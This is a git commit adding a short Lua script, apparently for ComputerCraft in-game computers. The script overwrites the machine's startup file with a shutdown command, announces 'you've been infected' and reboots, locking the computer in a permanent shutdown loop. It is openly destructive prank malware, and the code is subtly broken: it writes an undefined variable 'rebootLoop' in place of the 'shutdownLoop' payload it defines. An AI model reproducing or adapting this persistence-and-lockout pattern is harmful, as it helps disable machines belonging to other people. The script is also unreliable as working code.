9824ac5dc318ec906c01707f6665dc4143a1cbca
Tobiaszeqq <138253740+Tobiaszeqq@users.noreply.github.com>
2024-12-28 22:57:28 +0100

    Add files via upload
    simplified neverstartagain without gui based on rebootloop

---
+++ shutdownLoop.lua
@@ -0,0 +1,13 @@
+local shutdownLoop = [[
+term.setCursorPos(1, 1)
+os.shutdown()
+]]
+
+-- Edit startup.lua
+local file = fs.open("startup", "w")
+file.write(rebootLoop)
+file.close()
+term.clear()
+print("you've been infected shutdown loop, your pc is gonna restart in 3 seconds and its going to be in shutdown loop. craft a new pc")
+sleep(3)
+os.reboot()
